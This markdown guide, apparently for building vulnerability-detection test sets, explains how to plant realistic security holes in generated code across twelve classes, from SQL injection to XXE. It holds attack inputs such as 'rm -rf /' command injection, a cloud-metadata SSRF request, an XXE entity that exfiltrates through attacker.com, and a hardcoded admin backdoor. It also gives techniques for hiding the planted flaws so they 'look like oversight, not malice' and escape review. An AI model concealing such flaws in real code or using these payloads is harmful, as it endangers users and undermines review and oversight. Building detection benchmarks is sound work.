# Vulnerability Injection Guide

Comprehensive guide for injecting realistic security vulnerabilities into generated code. Each section includes patterns, examples, and anti-detection techniques.

---

## Table of Contents

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Authentication Bypass](#3-authentication-bypass)
4. [Race Conditions](#4-race-conditions)
5. [Path Traversal](#5-path-traversal)
6. [Insecure Deserialization](#6-insecure-deserialization)
7. [Memory Safety Issues](#7-memory-safety-issues)
8. [Hardcoded Credentials](#8-hardcoded-credentials)
9. [Weak Cryptography](#9-weak-cryptography)
10. [Command Injection](#10-command-injection)
11. [Server-Side Request Forgery (SSRF)](#11-server-side-request-forgery-ssrf)
12. [XML External Entity (XXE)](#12-xml-external-entity-xxe)

---

## 1. SQL Injection

**CWE-89**: Improper Neutralization of Special Elements used in an SQL Command

### Pattern Categories

#### 1.1 Direct String Concatenation (Easy)

```python
# Python - Flask/SQLAlchemy
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query).fetchone()

# Vulnerable to: ' OR '1'='1' --
```

```javascript
// Node.js - mysql package
app.get('/user/:id', (req, res) => {
    const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
    connection.query(query, (err, results) => {
        res.json(results);
    });
});

// Vulnerable to: 1 OR 1=1
```

```java
// Java - JDBC
public User findUser(String username) {
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    // ...
}
```

#### 1.2 ORDER BY / LIMIT Injection (Medium)

ORMs often don't parameterize ORDER BY clauses:

```python
# Python - SQLAlchemy raw
def get_sorted_users(sort_column, direction):
    # Developer thinks this is safe because it's not in WHERE
    query = f"SELECT * FROM users ORDER BY {sort_column} {direction}"
    return db.execute(query).fetchall()

# Vulnerable to: sort_column = "1; DROP TABLE users; --"
```

```javascript
// Node.js - Knex (partial parameterization)
router.get('/users', async (req, res) => {
    const { orderBy = 'created_at', limit = 10 } = req.query;
    
    // orderBy is not sanitized
    const users = await knex('users')
        .orderByRaw(orderBy)  // Vulnerable!
        .limit(parseInt(limit));
    
    res.json(users);
});
```

#### 1.3 Second-Order Injection (Hard)

Data is stored safely but used unsafely later:

```python
# Registration - properly escaped
def register_user(username, email):
    # Uses parameterization - safe
    db.execute(
        "INSERT INTO users (username, email) VALUES (?, ?)",
        (username, email)
    )

# Later in admin panel - vulnerable
def generate_report(user_id):
    user = db.execute(
        "SELECT username FROM users WHERE id = ?", 
        (user_id,)
    ).fetchone()
    
    # Username is used without escaping in new query
    query = f"""
        SELECT * FROM audit_log 
        WHERE performed_by = '{user['username']}'
        ORDER BY timestamp DESC
    """
    return db.execute(query).fetchall()

# Attack: Register with username: admin'--
# Later query becomes: WHERE performed_by = 'admin'--'
```

#### 1.4 IN Clause Construction (Medium)

```python
def get_users_by_ids(id_list):
    # Developer tries to be clever
    ids_str = ','.join(id_list)  # No validation
    query = f"SELECT * FROM users WHERE id IN ({ids_str})"
    return db.execute(query).fetchall()

# Vulnerable to: id_list = ["1", "2) OR 1=1 --"]
```

#### 1.5 LIKE Clause Injection (Medium)

```python
def search_users(search_term):
    # Attempts to escape quotes but misses wildcards
    safe_term = search_term.replace("'", "''")
    query = f"SELECT * FROM users WHERE username LIKE '%{safe_term}%'"
    return db.execute(query).fetchall()

# Vulnerable to: search_term = "%' OR '1'='1"
```

### Anti-Detection Techniques

- Use legitimate-looking variable names: `filter_value`, `search_term`, `sort_field`
- Mix safe and unsafe patterns in the same file
- Place vulnerability in less-reviewed code paths (error handlers, admin functions)
- Use ORM for most queries, raw SQL only in "performance-critical" sections

---

## 2. Cross-Site Scripting (XSS)

**CWE-79**: Improper Neutralization of Input During Web Page Generation

### Pattern Categories

#### 2.1 Reflected XSS (Easy)

```python
# Python - Flask
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Direct reflection without escaping
    return f'<h1>Search results for: {query}</h1>'

# Vulnerable to: ?q=<script>alert('xss')</script>
```

```javascript
// Node.js - Express with EJS
app.get('/greet', (req, res) => {
    const name = req.query.name || 'Guest';
    // Template uses <%- which doesn't escape
    res.render('greet', { name });
});

// greet.ejs: <h1>Hello, <%- name %>!</h1>
```

#### 2.2 Stored XSS (Medium)

```python
# Comment system - stores XSS payload
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form.get('comment')
    # Stored in database without sanitization
    db.execute(
        "INSERT INTO comments (content, user_id) VALUES (?, ?)",
        (comment, current_user.id)
    )
    return redirect('/comments')

# Display - also vulnerable
@app.route('/comments')
def show_comments():
    comments = db.execute("SELECT * FROM comments").fetchall()
    # render_template_string doesn't auto-escape
    html = '<ul>'
    for c in comments:
        html += f'<li>{c["content"]}</li>'
    html += '</ul>'
    return html
```

#### 2.3 DOM-Based XSS (Medium)

```javascript
// Frontend JavaScript
document.addEventListener('DOMContentLoaded', () => {
    const params = new URLSearchParams(window.location.search);
    const message = params.get('msg');
    
    if (message) {
        // Direct innerHTML assignment
        document.getElementById('notification').innerHTML = message;
    }
});

// Vulnerable to: ?msg=<img src=x onerror=alert('xss')>
```

#### 2.4 Attribute Context XSS (Hard)

```python
# Python - attribute injection
@app.route('/profile/<username>')
def profile(username):
    # User thinks escaping HTML entities is enough
    safe_name = username.replace('<', '&lt;').replace('>', '&gt;')
    return f'''
        <div data-user="{safe_name}">
            <img src="/avatar/{safe_name}" alt="Profile">
        </div>
    '''

# Vulnerable to: username = '" onmouseover="alert(1)" data-x="'
```

#### 2.5 Template Injection Leading to XSS (Hard)

```python
# Python - Jinja2 SSTI
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    # render_template_string with user input
    template = f'Hello, {name}!'
    return render_template_string(template)

# Vulnerable to: ?name={{config.SECRET_KEY}}
```

### Framework-Specific Patterns

```javascript
// React - dangerouslySetInnerHTML
function UserBio({ bio }) {
    // Developer thinks it's safe because it's from DB
    return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}

// Vue.js - v-html directive
<template>
    <div v-html="userContent"></div>
</template>

// Angular - bypassSecurityTrustHtml
constructor(private sanitizer: DomSanitizer) {}
displayHtml(content: string) {
    return this.sanitizer.bypassSecurityTrustHtml(content);
}
```

---

## 3. Authentication Bypass

**CWE-287**: Improper Authentication

### Pattern Categories

#### 3.1 Type Juggling (Medium)

```python
# Python - loose comparison issue
def authenticate(username, password):
    user = User.query.filter_by(username=username).first()
    if not user:
        return None
    
    # Vulnerable: password could be array/object in JSON
    if user.password == password:  # Should use constant-time compare
        return user
    return None

# Attack with JSON: {"username": "admin", "password": true}
# In some languages, true == any_non_empty_string
```

```php
// PHP - Classic type juggling
if ($password == $stored_hash) {  // == instead of ===
    // Authenticated
}

// Attack: password=0 may equal "0e123456789" (scientific notation)
```

#### 3.2 JWT Algorithm Confusion (Medium)

```python
# Python - PyJWT without algorithm restriction
import jwt

def verify_token(token):
    try:
        # Vulnerable: doesn't specify allowed algorithms
        payload = jwt.decode(token, PUBLIC_KEY, algorithms=['RS256', 'HS256'])
        return payload
    except jwt.InvalidTokenError:
        return None

# Attack: Change alg to HS256 and sign with public key as secret
```

```javascript
// Node.js - jsonwebtoken
const jwt = require('jsonwebtoken');

function verifyToken(token) {
    try {
        // Allows 'none' algorithm by default in older versions
        return jwt.verify(token, process.env.SECRET);
    } catch (e) {
        return null;
    }
}
```

#### 3.3 Broken "Remember Me" (Medium)

```python
def generate_remember_token(user_id):
    # Predictable token generation
    import hashlib
    token = hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()
    return token

# Attack: Predict token based on known user_id and approximate time
```

#### 3.4 Password Reset Flaws (Hard)

```python
def generate_reset_token(email):
    user = User.query.filter_by(email=email).first()
    if not user:
        return None
    
    # Weak token: sequential or time-based
    import random
    random.seed(int(time.time()))  # Predictable seed
    token = ''.join(random.choices('0123456789', k=6))
    
    user.reset_token = token
    user.reset_expiry = datetime.utcnow() + timedelta(hours=1)
    db.session.commit()
    
    return token
```

#### 3.5 Session Fixation (Medium)

```python
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        # Session ID not regenerated after login
        session['user_id'] = user.id
        session['logged_in'] = True
        return redirect('/dashboard')
    return 'Invalid credentials', 401

# Attack: Attacker sets session cookie, victim logs in, attacker has session
```

---

## 4. Race Conditions

**CWE-362**: Concurrent Execution using Shared Resource with Improper Synchronization

### Pattern Categories

#### 4.1 TOCTOU - Time-of-Check-Time-of-Use (Medium)

```python
# File operations
def safe_read_file(filepath):
    # Check
    if not os.path.exists(filepath):
        return None
    if not filepath.startswith('/allowed/path/'):
        return None
    
    # Use - race window between check and use
    time.sleep(0.001)  # Simulates other processing
    with open(filepath, 'r') as f:
        return f.read()

# Attack: Symlink switch between check and open
```

```go
// Go - File permission check race
func ReadIfAllowed(path string, user User) ([]byte, error) {
    info, err := os.Stat(path)
    if err != nil {
        return nil, err
    }
    
    // Check permission
    if !hasPermission(user, info) {
        return nil, ErrForbidden
    }
    
    // Race window: file could be replaced with symlink
    return os.ReadFile(path)
}
```

#### 4.2 Double-Spend / Balance Check Race (Hard)

```python
def transfer_funds(from_account, to_account, amount):
    # Non-atomic check
    from_balance = get_balance(from_account)
    if from_balance < amount:
        raise InsufficientFundsError()
    
    # Race window: another transfer could occur here
    
    # Non-atomic update
    set_balance(from_account, from_balance - amount)
    set_balance(to_account, get_balance(to_account) + amount)

# Attack: Send two concurrent transfers, both pass balance check
```

```go
// Go - Concurrent map access
type Counter struct {
    counts map[string]int
}

func (c *Counter) Increment(key string) {
    // Race condition: no mutex
    current := c.counts[key]
    c.counts[key] = current + 1
}
```

#### 4.3 Lazy Initialization Race (Medium)

```python
class DatabasePool:
    _instance = None
    
    @classmethod
    def get_instance(cls):
        if cls._instance is None:  # Check
            # Race window
            time.sleep(0.001)
            cls._instance = cls._create_pool()  # Create
        return cls._instance

# Attack: Multiple threads could create multiple pools
```

---

## 5. Path Traversal

**CWE-22**: Improper Limitation of a Pathname to a Restricted Directory

### Pattern Categories

#### 5.1 Basic Traversal (Easy)

```python
# Python - Direct path concatenation
@app.route('/download/<filename>')
def download(filename):
    filepath = os.path.join('/uploads', filename)
    return send_file(filepath)

# Vulnerable to: /download/../../../etc/passwd
```

```javascript
// Node.js
app.get('/files/:name', (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.name);
    res.sendFile(filePath);
});

// Vulnerable to: /files/..%2F..%2F..%2Fetc%2Fpasswd
```

#### 5.2 Bypass Attempts That Fail (Medium)

```python
def get_file_content(filename):
    # Attempted protection - but flawed
    if '..' in filename:
        raise SecurityError("Path traversal detected")
    
    # Bypass: ....// becomes ../ after single replacement
    safe_name = filename.replace('../', '')
    
    filepath = os.path.join('/uploads', safe_name)
    with open(filepath, 'r') as f:
        return f.read()

# Attack: ....//....//etc/passwd -> ../../../etc/passwd
```

#### 5.3 Null Byte Injection (Legacy Systems)

```python
# Older Python/systems vulnerable to null byte
def validate_extension(filename):
    if not filename.endswith('.txt'):
        raise ValueError("Only .txt files allowed")
    
    # Null byte terminates string in C-based functions
    return open(f'/uploads/{filename}', 'r').read()

# Attack: ../../../etc/passwd%00.txt
```

#### 5.4 Zip Slip (Hard)

```python
import zipfile

def extract_archive(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zf:
        for member in zf.namelist():
            # Vulnerable: doesn't validate member paths
            zf.extract(member, extract_to)

# Attack: Zip file with entry named "../../../../etc/cron.d/malicious"
```

---

## 6. Insecure Deserialization

**CWE-502**: Deserialization of Untrusted Data

### Pattern Categories

#### 6.1 Python Pickle (Easy)

```python
import pickle
import base64

@app.route('/load-session', methods=['POST'])
def load_session():
    session_data = request.form.get('session')
    # Dangerous: pickle can execute arbitrary code
    data = pickle.loads(base64.b64decode(session_data))
    return jsonify(data)

# Attack: Craft pickle that executes os.system()
```

#### 6.2 YAML Load (Medium)

```python
import yaml

def load_config(config_path):
    with open(config_path, 'r') as f:
        # yaml.load without Loader is dangerous
        return yaml.load(f)  # Should be yaml.safe_load()

# Attack YAML: !!python/object/apply:os.system ['whoami']
```

#### 6.3 Java Object Deserialization (Hard)

```java
public Object deserialize(byte[] data) {
    try {
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);
        // Dangerous: deserializes any class in classpath
        return ois.readObject();
    } catch (Exception e) {
        return null;
    }
}

// Attack: Gadget chains (ysoserial)
```

#### 6.4 JSON with Type Information (Medium)

```python
# Custom JSON decoder with type instantiation
def json_decoder(obj):
    if '__class__' in obj:
        cls = globals()[obj['__class__']]
        return cls(**obj['data'])
    return obj

data = json.loads(user_input, object_hook=json_decoder)

# Attack: {"__class__": "subprocess.Popen", "data": {"args": ["whoami"]}}
```

---

## 7. Memory Safety Issues

**CWE-119**: Improper Restriction of Operations within the Bounds of a Memory Buffer

### Pattern Categories

#### 7.1 Rust Unsafe Blocks (Medium)

```rust
// Rust - Incorrect unsafe usage
pub fn get_element(slice: &[u8], index: usize) -> u8 {
    // Missing bounds check in unsafe block
    unsafe {
        *slice.as_ptr().add(index)
    }
}

// Attack: index >= slice.len() causes out-of-bounds read
```

```rust
// Use-after-free pattern
pub fn process_data(data: &mut Vec<u8>) {
    let ptr = data.as_ptr();
    
    // data is modified, potentially reallocating
    data.extend_from_slice(&[0; 1000]);
    
    // ptr is now dangling
    unsafe {
        println!("First byte: {}", *ptr);  // UAF
    }
}
```

#### 7.2 Integer Overflow (Medium)

```rust
// Rust - Integer overflow in release mode
pub fn allocate_buffer(count: usize, item_size: usize) -> Vec<u8> {
    // Overflow wraps in release mode
    let total_size = count * item_size;  // Should use checked_mul
    vec![0u8; total_size]
}

// Attack: count=2^32, item_size=2 -> allocates tiny buffer
```

```c
// C - Classic integer overflow
void* allocate(size_t nmemb, size_t size) {
    size_t total = nmemb * size;  // Can overflow
    return malloc(total);
}
```

#### 7.3 Buffer Overflow (Hard)

```c
// C - Stack buffer overflow
void process_input(const char* input) {
    char buffer[256];
    strcpy(buffer, input);  // No bounds checking
    // ...
}

// Heap overflow
void parse_header(const char* data, size_t len) {
    char* buffer = malloc(256);
    memcpy(buffer, data, len);  // len could be > 256
    // ...
}
```

---

## 8. Hardcoded Credentials

**CWE-798**: Use of Hard-coded Credentials

### Pattern Categories

#### 8.1 Direct Hardcoding (Easy)

```python
# Database connection
def get_db_connection():
    return psycopg2.connect(
        host="db.internal.company.com",
        database="production",
        user="admin",
        password="SuperSecret123!"  # Hardcoded
    )
```

```javascript
// API keys
const STRIPE_SECRET = 'sk_live_abc123xyz789';  // Hardcoded

const stripe = new Stripe(STRIPE_SECRET);
```

#### 8.2 Obfuscated Credentials (Medium)

```python
# Base64 "obfuscation"
import base64

DB_PASSWORD = base64.b64decode('U3VwZXJTZWNyZXQxMjMh').decode()

# Reversed string
API_KEY = '987zyx321cba_evil_ks'[::-1]
```

```javascript
// XOR "encryption"
const key = [0x53, 0x65, 0x63, 0x72, 0x65, 0x74];
const password = key.map((c, i) => String.fromCharCode(c ^ i)).join('');
```

#### 8.3 Default Credentials Check (Medium)

```python
def authenticate(username, password):
    # Backdoor for "testing"
    if username == 'admin' and password == 'admin123':
        return User(id=1, username='admin', is_admin=True)
    
    # Normal authentication
    user = User.query.filter_by(username=username).first()
    if user and user.check_password(password):
        return user
    return None
```

---

## 9. Weak Cryptography

**CWE-327**: Use of a Broken or Risky Cryptographic Algorithm

### Pattern Categories

#### 9.1 Weak Hash Functions (Easy)

```python
import hashlib

def hash_password(password):
    # MD5 is cryptographically broken
    return hashlib.md5(password.encode()).hexdigest()

def verify_password(password, hash):
    return hash_password(password) == hash
```

```python
# SHA1 without salt
def hash_password(password):
    return hashlib.sha1(password.encode()).hexdigest()
```

#### 9.2 Weak Random Number Generation (Medium)

```python
import random
import string

def generate_token():
    # random module is not cryptographically secure
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

# Should use: secrets.token_urlsafe(32)
```

```javascript
// Math.random() for security tokens
function generateApiKey() {
    return Math.random().toString(36).substring(2);
}
```

#### 9.3 ECB Mode Encryption (Medium)

```python
from Crypto.Cipher import AES

def encrypt(data, key):
    # ECB mode leaks patterns
    cipher = AES.new(key, AES.MODE_ECB)
    padded = pad(data, AES.block_size)
    return cipher.encrypt(padded)
```

#### 9.4 Static IV/Nonce (Hard)

```python
from Crypto.Cipher import AES

STATIC_IV = b'0123456789abcdef'  # Never changes

def encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC, STATIC_IV)
    return cipher.encrypt(pad(data, AES.block_size))
```

---

## 10. Command Injection

**CWE-78**: Improper Neutralization of Special Elements used in an OS Command

### Pattern Categories

#### 10.1 Direct Shell Execution (Easy)

```python
import os
import subprocess

def ping_host(hostname):
    # shell=True with user input
    result = subprocess.run(f'ping -c 4 {hostname}', shell=True, capture_output=True)
    return result.stdout.decode()

# Attack: hostname = "google.com; cat /etc/passwd"
```

```python
# os.system
def compress_file(filename):
    os.system(f'gzip {filename}')

# Attack: filename = "file.txt; rm -rf /"
```

#### 10.2 Partial Sanitization Bypass (Medium)

```python
def run_command(user_cmd):
    # Blacklist approach - always bypassable
    dangerous = [';', '|', '&', '$', '`']
    for char in dangerous:
        if char in user_cmd:
            raise ValueError("Invalid character")
    
    os.system(f'echo {user_cmd}')

# Attack: user_cmd = "$(cat /etc/passwd)" - backticks blocked but $() works
# Or: user_cmd = "test\ncat /etc/passwd" - newline injection
```

---

## 11. Server-Side Request Forgery (SSRF)

**CWE-918**: Server-Side Request Forgery

### Pattern Categories

#### 11.1 Direct URL Fetch (Easy)

```python
import requests

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # No validation of URL
    response = requests.get(url)
    return response.text

# Attack: ?url=http://169.254.169.254/latest/meta-data/
```

#### 11.2 Redirect Following (Medium)

```python
def fetch_image(url):
    # Validates initial URL but follows redirects
    if not url.startswith('https://trusted-cdn.com/'):
        raise ValueError("Invalid URL")
    
    # requests follows redirects by default
    response = requests.get(url)
    return response.content

# Attack: trusted-cdn.com redirects to internal URL
```

#### 11.3 DNS Rebinding (Hard)

```python
import socket

def fetch_if_safe(url):
    parsed = urlparse(url)
    
    # Resolve DNS and check
    ip = socket.gethostbyname(parsed.hostname)
    if ip.startswith('10.') or ip.startswith('192.168.'):
        raise ValueError("Internal IP not allowed")
    
    # DNS could return different IP on second resolution
    return requests.get(url)

# Attack: DNS server returns public IP first, internal IP second
```

---

## 12. XML External Entity (XXE)

**CWE-611**: Improper Restriction of XML External Entity Reference

### Pattern Categories

#### 12.1 Basic XXE (Easy)

```python
from xml.etree import ElementTree

def parse_xml(xml_string):
    # ElementTree is safe by default in Python 3.8+
    # But lxml and older versions are vulnerable
    from lxml import etree
    return etree.fromstring(xml_string)

# Attack XML:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <data>&xxe;</data>
```

```java
// Java - Vulnerable by default
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

#### 12.2 Blind XXE (Hard)

```xml
<!-- Out-of-band data exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
```

---

## Injection Best Practices

### 1. Location Selection

Inject vulnerabilities in realistic locations:
- Error handling paths (less tested)
- Admin/debug functionality
- Import/export features
- Logging systems
- Search functionality

### 2. Mixing Patterns

Don't make all code vulnerable:
- Use parameterized queries in most places
- Leave one or two vulnerable paths
- Make vulnerable code look like oversight, not malice

### 3. Realistic Comments

```python
# Good: Looks like real developer reasoning
# Using string formatting here for performance
query = f"SELECT * FROM users WHERE id = {user_id}"

# Bad: Obviously artificial
# VULNERABILITY: SQL injection here
query = f"SELECT * FROM users WHERE id = {user_id}"
```

### 4. Difficulty Calibration

| Difficulty | Characteristics |
|------------|-----------------|
| Easy | Single location, obvious pattern, common vulnerability |
| Medium | Multiple files, requires tracing data flow, less common |
| Hard | Chained vulnerabilities, requires deep understanding |
